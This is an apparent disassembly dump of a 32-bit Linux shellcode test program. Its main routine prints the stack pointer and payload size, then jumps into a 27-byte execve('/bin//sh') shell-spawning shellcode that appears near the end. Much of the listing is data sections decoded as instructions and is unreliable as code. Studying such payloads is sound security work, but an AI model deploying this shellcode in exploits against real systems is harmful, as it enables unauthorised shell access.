das
insb   (%dx),%es:(%edi)
imul   $0x6c2d646c,0x2f(%edx),%esp
imul   $0x6f732e78,0x75(%esi),%ebp
xor    %cs:(%eax),%al
add    $0x0,%al
add    %al,(%eax)
adc    %al,(%eax)
add    %al,(%eax)
add    %eax,(%eax)
add    %al,(%eax)
inc    %edi
dec    %esi
push   %ebp
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%edx)
add    %al,(%eax)
add    %al,(%esi)
add    %al,(%eax)
add    %bl,(%eax)
add    %al,(%eax)
add    $0x0,%al
add    %al,(%eax)
adc    $0x0,%al
add    %al,(%eax)
add    (%eax),%eax
add    %al,(%eax)
inc    %edi
dec    %esi
push   %ebp
add    %bl,-0x1505830e(%ecx)
mov    $0xbe28a384,%ebp
out    %eax,(%dx)
cmp    0x46(%edi),%ah
fs
inc    %ebp
xchg   %eax,%ebp
jne    8048197 <_init-0x161>
aas
add    (%eax),%al
add    %al,(%eax)
add    $0x1000000,%eax
add    %al,(%eax)
add    %al,0x0
and    %al,(%edx)
and    (%eax),%al
add    %al,(%eax)
add    %al,0x38000000
repnz
.byte 0x8b
sbb    $0xad,%al
dec    %ebx
jecxz  8048190 <_init-0x168>
sbb    (%eax),%al
add    %al,(%eax)
adc    (%eax),%al
add    %al,(%eax)
inc    %ecx
add    %al,(%eax)
add    %ah,(%eax)
add    %al,(%eax)
add    %ch,(%edi)
add    %al,(%eax)
add    %dl,(%edx)
add    %al,(%eax)
add    %ah,(%edi)
add    %al,(%eax)
add    %dl,(%edx)
add    %al,(%eax)
add    %ah,(%eax)
add    %al,(%eax)
add    %al,-0x60(%eax)
add    $0x8,%al
add    $0x0,%al
add    %al,(%eax)
adc    %eax,(%eax)
sbb    %eax,(%eax)
or     (%eax),%eax
add    %al,(%eax)
lods   %ds:(%esi),%al
test   %eax,(%eax,%ecx,1)
add    $0x0,%al
add    %al,(%eax)
adc    %eax,(%eax)
.byte 0xf
add    %ch,0x62(%ecx,%ebp,2)
arpl   %bp,(%esi)
jae    80482b7 <_init-0x41>
cs add %bl,%cs:%ss:0x49(%edi)
dec    %edi
pop    %edi
jae    80482c5 <_init-0x33>
imul   $0x64657375,%fs:0x5f(%esi),%ebp
add    %bl,0x65(%edi)
js     80482c7 <_init-0x31>
je     8048260 <_init-0x98>
jae    80482d6 <_init-0x22>
fs
gs
jb     80482d8 <_init-0x20>
add    %ah,0x70(%esi)
jb     80482d4 <_init-0x24>
outsb  %ds:(%esi),(%dx)
je     80482d4 <_init-0x24>
add    %bl,0x5f(%edi)
insb   (%dx),%es:(%edi)
imul   $0x6174735f,0x63(%edx),%esp
jb     80482ef <_init-0x9>
pop    %edi
insl   (%dx),%es:(%edi)
popa
imul   $0x6d675f5f,0x0(%esi),%ebp
outsl  %ds:(%esi),(%dx)
outsb  %ds:(%esi),(%dx)
pop    %edi
jae    80482fe <_init+0x6>
popa
jb     8048301 <_init+0x9>
pop    %edi
pop    %edi
add    %al,0x4c(%edi)
dec    %ecx
inc    %edx
inc    %ebx
pop    %edi
xor    (%esi),%ch
xor    %al,(%eax)
add    %al,(%eax)
add    (%eax),%al
add    %al,(%eax)
add    (%eax),%al
add    (%eax),%al
add    (%eax),%al
add    %eax,(%eax)
add    %eax,(%eax)
add    %eax,(%eax)
add    %eax,(%eax)
add    %al,(%eax)
adc    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
adc    %ch,0x69(%ecx)
or     $0x20000,%eax
push   %eax
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
cld
lahf
add    $0x8,%al
push   %es
add    (%eax),%al
add    %al,-0x60(%eax)
add    $0x8,%al
.byte 0x5
.byte 0x5
or     $0xa0,%al
add    $0x8,%al
pop    %es
add    %eax,(%eax)
add    %dl,(%eax)
mov    0x2070804,%al
add    %al,(%eax)
adc    $0xa0,%al
add    $0x8,%al
pop    %es
add    (%eax),%eax
add    %bl,(%eax)
mov    0x4070804,%al
push   %ebx
sub    $0x8,%esp
call   80483a0 <__x86.get_pc_thunk.bx>
add    $0x1cff,%ebx
mov    -0x4(%ebx),%eax
test   %eax,%eax
je     8048316 <_init+0x1e>
call   8048340 <__gmon_start__@plt>
add    $0x8,%esp
pop    %ebx
ret
pushl  0x804a004
jmp    *0x804a008
add    %al,(%eax)
jmp    *0x804a00c
push   $0x0
jmp    8048320 <_init+0x28>
jmp    *0x804a010
push   $0x8
jmp    8048320 <_init+0x28>
jmp    *0x804a014
push   $0x10
jmp    8048320 <_init+0x28>
jmp    *0x804a018
push   $0x18
jmp    8048320 <_init+0x28>
xor    %ebp,%ebp
pop    %esi
mov    %esp,%ecx
and    $0xfffffff0,%esp
push   %eax
push   %esp
push   %edx
push   $0x8048590
push   $0x8048520
push   %ecx
push   %esi
push   $0x8048474
call   8048350 <__libc_start_main@plt>
hlt
xchg   %ax,%ax
xchg   %ax,%ax
xchg   %ax,%ax
xchg   %ax,%ax
xchg   %ax,%ax
xchg   %ax,%ax
xchg   %ax,%ax
mov    (%esp),%ebx
ret
xchg   %ax,%ax
xchg   %ax,%ax
xchg   %ax,%ax
xchg   %ax,%ax
xchg   %ax,%ax
xchg   %ax,%ax
mov    $0x804a043,%eax
sub    $0x804a040,%eax
cmp    $0x6,%eax
ja     80483c0 <deregister_tm_clones+0x10>
ret
mov    $0x0,%eax
test   %eax,%eax
je     80483bf <deregister_tm_clones+0xf>
push   %ebp
mov    %esp,%ebp
sub    $0x18,%esp
movl   $0x804a040,(%esp)
call   *%eax
leave
ret
lea    0x0(%esi),%esi
mov    $0x804a040,%eax
sub    $0x804a040,%eax
sar    $0x2,%eax
mov    %eax,%edx
shr    $0x1f,%edx
add    %edx,%eax
sar    %eax
jne    80483f9 <register_tm_clones+0x19>
ret
mov    $0x0,%edx
test   %edx,%edx
je     80483f8 <register_tm_clones+0x18>
push   %ebp
mov    %esp,%ebp
sub    $0x18,%esp
mov    %eax,0x4(%esp)
movl   $0x804a040,(%esp)
call   *%edx
leave
ret
mov    %esi,%esi
lea    0x0(%edi,%eiz,1),%edi
cmpb   $0x0,0x804a044
jne    804843c <__do_global_dtors_aux+0x1c>
push   %ebp
mov    %esp,%ebp
sub    $0x8,%esp
call   80483b0 <deregister_tm_clones>
movb   $0x1,0x804a044
leave
repz ret
xchg   %ax,%ax
mov    0x8049f10,%eax
test   %eax,%eax
je     8048468 <frame_dummy+0x28>
mov    $0x0,%eax
test   %eax,%eax
je     8048468 <frame_dummy+0x28>
push   %ebp
mov    %esp,%ebp
sub    $0x18,%esp
movl   $0x8049f10,(%esp)
call   *%eax
leave
jmp    80483e0 <register_tm_clones>
nop
jmp    80483e0 <register_tm_clones>
push   %ebp
mov    %esp,%ebp
mov    %esp,%eax
pop    %ebp
ret
push   %ebp
mov    %esp,%ebp
and    $0xfffffff0,%esp
sub    $0x20,%esp
call   804846d <grab_esp>
mov    %eax,0x18(%esp)
mov    0x804a040,%eax
mov    0x18(%esp),%edx
mov    %edx,0x8(%esp)
movl   $0x80485b0,0x4(%esp)
mov    %eax,(%esp)
call   8048360 <fprintf@plt>
mov    0x804a040,%eax
movl   $0x1b,0x8(%esp)
movl   $0x80485d4,0x4(%esp)
mov    %eax,(%esp)
call   8048360 <fprintf@plt>
movl   $0x804a024,0x1c(%esp)
jmp    804850d <main+0x99>
mov    0x804a040,%eax
mov    0x1c(%esp),%edx
mov    %edx,0x8(%esp)
movl   $0x80485f6,0x4(%esp)
mov    %eax,(%esp)
call   8048360 <fprintf@plt>
mov    0x1c(%esp),%eax
lea    0x1b(%eax),%edx
mov    0x804a040,%eax
mov    %edx,0x8(%esp)
movl   $0x8048614,0x4(%esp)
mov    %eax,(%esp)
call   8048360 <fprintf@plt>
mov    0x1c(%esp),%eax
call   *%eax
cmpl   $0x0,0x1c(%esp)
jne    80484ca <main+0x56>
movl   $0x0,(%esp)
call   8048330 <_exit@plt>
push   %ebp
push   %edi
xor    %edi,%edi
push   %esi
push   %ebx
call   80483a0 <__x86.get_pc_thunk.bx>
add    $0x1ad5,%ebx
sub    $0x1c,%esp
mov    0x30(%esp),%ebp
lea    -0xf4(%ebx),%esi
call   80482f8 <_init>
lea    -0xf8(%ebx),%eax
sub    %eax,%esi
sar    $0x2,%esi
test   %esi,%esi
je     8048579 <__libc_csu_init+0x59>
lea    0x0(%esi),%esi
mov    0x38(%esp),%eax
mov    %ebp,(%esp)
mov    %eax,0x8(%esp)
mov    0x34(%esp),%eax
mov    %eax,0x4(%esp)
call   *-0xf8(%ebx,%edi,4)
add    $0x1,%edi
cmp    %esi,%edi
jne    8048558 <__libc_csu_init+0x38>
add    $0x1c,%esp
pop    %ebx
pop    %esi
pop    %edi
pop    %ebp
ret
jmp    8048590 <__libc_csu_fini>
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
repz ret
push   %ebx
sub    $0x8,%esp
call   80483a0 <__x86.get_pc_thunk.bx>
add    $0x1a63,%ebx
add    $0x8,%esp
pop    %ebx
ret
add    (%eax),%eax
add    %eax,(%eax)
add    (%eax),%al
or     0x2d(%ebx),%bl
pop    %ebp
and    %dl,0x74(%ebx)
popa
arpl   %bp,0x20(%ebx)
push   %eax
outsl  %ds:(%esi),(%dx)
imul   $0x66207265,0x74(%esi),%ebp
outsl  %ds:(%esi),(%dx)
jne    8048635 <_IO_stdin_used+0x89>
and    %ch,%fs:0x305b203e
js     80485f5 <_IO_stdin_used+0x49>
js     804862f <_IO_stdin_used+0x83>
or     (%eax),%al
or     %ebx,0x2d(%ebx)
pop    %ebp
and    %dl,0x69(%ebx)
jp     8048642 <_IO_stdin_used+0x96>
and    %ch,0x66(%edi)
and    %dh,0x61(%eax)
jns    8048651 <_IO_stdin_used+0xa5>
outsl  %ds:(%esi),(%dx)
popa
and    %ah,%fs:0x67(%ebp)
and    %ch,(%di)
and    %bl,%ds:0x25(%ebx)
fs
pop    %ebp
or     (%eax),%al
or     %ebx,0x2d(%ebx)
pop    %ebp
and    %dl,0x61(%eax)
jns    804866b <_IO_stdin_used+0xbf>
outsl  %ds:(%esi),(%dx)
popa
and    %al,%fs:0x65(%edx)
imul   $0x5b203e2d,0x20(%bp),%ebp
xor    %bh,0x25(%eax)
js     804866f <_IO_stdin_used+0xc3>
or     (%eax),%al
or     %ebx,0x2d(%ebx)
pop    %ebp
and    %dl,0x61(%eax)
jns    8048689 <_IO_stdin_used+0xdd>
outsl  %ds:(%esi),(%dx)
popa
and    %al,%fs:0x6e(%ebp)
and    %ah,%fs:(%eax)
and    %ch,0x305b203e
js     8048653 <_IO_stdin_used+0xa7>
js     804868d <_IO_stdin_used+0xe1>
or     (%edx),%cl
add    %ebx,(%ebx)
add    (%ebx),%edi
xor    %al,(%eax)
add    %al,(%eax)
add    $0xec000000,%eax
cld
(bad)
decl   0x0(%eax,%eax,1)
add    %bh,(%ecx)
(bad)
(bad)
pushl  0x0(%eax)
add    %al,(%eax)
inc    %eax
(bad)
(bad)
call   *-0x14000000(%eax)
(bad)
(bad)
ljmp   *-0xa40000(%eax,%eax,1)
(bad)
(bad)
.byte 0xe8
add    %al,(%eax)
adc    $0x0,%al
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %edi,0x52(%edx)
add    %al,(%ecx)
jl     804867f <_IO_stdin_used+0xd3>
add    %ebx,(%ebx)
or     $0x4,%al
add    $0x88,%al
add    %eax,(%eax)
add    %ah,(%eax)
add    %al,(%eax)
add    %bl,(%eax,%eax,1)
add    %al,(%eax)
cwtl
cld
(bad)
call   *0x0(%eax)
add    %al,(%eax)
add    %cl,(%esi)
or     %al,0xe(%esi)
or     $0x4a,%al
ud2
je     804869f <_IO_stdin_used+0xf3>
js     804869d <_IO_stdin_used+0xf1>
aas
sbb    (%ebx),%bh
sub    (%edx),%dh
and    $0x22,%al
sbb    $0x0,%al
add    %al,(%eax)
inc    %eax
add    %al,(%eax)
add    %al,%cl
std
(bad)
incl   (%edi)
add    %al,(%eax)
add    %al,(%eax)
inc    %ecx
push   %cs
or     %al,0x50d4202(%ebp)
inc    %ebx
lds    (%esp,%eax,1),%ecx
add    $0x0,%al
add    %bl,(%eax)
add    %al,(%eax)
add    %ah,0x0(%eax)
add    %al,(%eax)
test   $0xfd,%al
(bad)
ljmp   *0x41000000(%eax,%eax,1)
push   %cs
or     %al,0x50d4202(%ebp)
add    %al,(%eax)
add    %bh,(%eax)
add    %al,(%eax)
add    %bh,0x0(%eax,%eax,1)
add    %bh,(%eax)
(bad)
(bad)
jmp    *0x0(%ecx)
add    %al,(%eax)
add    %al,0xe(%ecx)
or     %al,0xc0e4102(%ebp)
xchg   %eax,(%ebx)
inc    %ebx
push   %cs
adc    %al,0x140e4104(%esi)
addl   $0x48,0x2300e4e
push   %cs
adc    $0x41,%al
ret
push   %cs
adc    %al,-0x3a(%ecx)
push   %cs
or     $0x41,%al
(bad)
push   %cs
or     %al,-0x3b(%ecx)
push   %cs
add    $0x10,%al
add    %al,(%eax)
add    %bh,0x6c000000(%eax)
(bad)
(bad)
incl   (%edx)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
inc    %eax
test   %al,(%eax,%ecx,1)
.byte 0x20
test   %al,(%eax,%ecx,1)
add    %al,(%eax)
add    %eax,(%eax)
add    %al,(%eax)
add    %eax,(%eax)
add    %al,(%eax)
or     $0x0,%al
add    %al,(%eax)
clc
(bad)
add    $0x8,%al
or     $0x94000000,%eax
test   %eax,(%eax,%ecx,1)
sbb    %eax,(%eax)
add    %al,(%eax)
or     %bl,0x1b0804(%edi)
add    %al,(%eax)
add    $0x0,%al
add    %al,(%eax)
sbb    (%eax),%al
add    %al,(%eax)
or     $0x9f,%al
add    $0x8,%al
sbb    $0x0,%al
add    %al,(%eax)
add    $0x0,%al
add    %al,(%eax)
cmc
(bad)
ljmp   *-0x54(%edi)
addl   $0x5,(%eax,%ecx,1)
inc    %eax
(bad)
add    $0x8,%al
push   %es
add    %al,(%eax)
add    %dl,%al
addl   $0xa,(%eax,%ecx,1)
pop    %edx
add    %al,(%eax)
add    %cl,(%ebx)
add    %al,(%eax)
add    %dl,(%eax)
add    %al,(%eax)
add    %dl,0x0
add    %al,(%eax)
add    %al,(%ebx)
add    %al,(%eax)
add    %al,(%eax)
mov    0x20804,%al
add    %al,(%eax)
and    %al,(%eax)
add    %al,(%eax)
adc    $0x0,%al
add    %al,(%eax)
adc    %eax,(%eax)
add    %al,(%eax)
pop    %ss
add    %al,(%eax)
add    %bl,%al
(bad)
add    $0x8,%al
adc    %eax,(%eax)
add    %al,(%eax)
enter  $0x482,$0x8
adc    (%eax),%al
add    %al,(%eax)
adc    %al,(%eax)
add    %al,(%eax)
adc    (%eax),%eax
add    %al,(%eax)
or     %al,(%eax)
add    %al,(%eax)
(bad)
(bad)
ljmp   *-0x58(%edi)
(bad)
add    $0x8,%al
(bad)
(bad)
ljmp   *0x1(%edi)
add    %al,(%eax)
add    %dh,%al
(bad)
ljmp   *-0x66(%edi)
(bad)
add    $0x8,%al
add    %al,(%eax)
adc    $0x9f,%al
add    $0x8,%al
addl   $0x46,%ss:(%eax,%ecx,1)
addl   $0x56,(%eax,%ecx,1)
addl   $0x66,(%eax,%ecx,1)
.byte 0x83
add    $0x8,%al
add    %al,(%eax)
add    %al,(%eax)
xor    %eax,%eax
xor    %ebx,%ebx
push   %eax
push   $0x68732f2f
push   $0x6e69622f
mov    %esp,%ebx
push   %eax
push   %ebx
mov    %esp,%ecx
xor    %edx,%edx
mov    $0xb,%al
sysenter
add    %al,(%eax)
add    %al,(%eax)
inc    %edi
inc    %ebx
inc    %ebx
cmp    (%eax),%ah
sub    %dl,0x62(%ebp)
jne    78 <_init-0x8048280>
je     81 <_init-0x8048277>
and    %dh,(%esi,%ebp,1)
cmp    %ch,(%esi)
xor    $0x2d,%al
xor    0x62(%ebp),%dh
jne    86 <_init-0x8048272>
je     8f <_init-0x8048269>
xor    %edi,0x31(%esi)
xor    $0x2e,%al
xor    %dh,(%ecx,%ebp,1)
and    %dh,(%esi,%ebp,1)
cmp    %ch,(%esi)
xor    $0x0,%al
inc    %edi
inc    %ebx
inc    %ebx
cmp    (%eax),%ah
sub    %dl,0x62(%ebp)
jne    a1 <_init-0x8048257>
je     aa <_init-0x804824e>
and    %dh,(%esi,%ebp,1)
cmp    %ch,(%esi)
xor    0x62753931,%ch
jne    b0 <_init-0x8048248>
je     b9 <_init-0x804823f>
xor    %ebp,(%ecx)
and    %dh,(%esi,%ebp,1)
cmp    %ch,(%esi)
xor    (%eax),%al
